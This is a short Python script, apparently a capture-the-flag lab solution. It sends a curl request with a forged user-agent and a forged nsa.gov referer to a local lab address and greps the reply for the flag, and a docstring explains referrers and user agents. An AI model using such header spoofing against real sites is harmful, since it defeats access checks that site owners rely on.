import os

class Spoof():
    '''
        Script created to follow the instructions given in comments of albatros page

        The referrer is the webpage that sends visitors to your site using a link. In other words, it's the webpage that a person was on right before they landed on your page.

        a user agent is software that is acting on behalf of a user,
        such as a web browser that "retrieves, renders and facilitates end user interaction with Web content". An email reader is a mail user agent.
    '''
    def run_spoof_attack():
        os.system("curl -A 'ft_bornToSec' --referer \"https://www.nsa.gov/\" \"192.168.1.99/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c\" | grep \"flag\"")

Spoof.run_spoof_attack()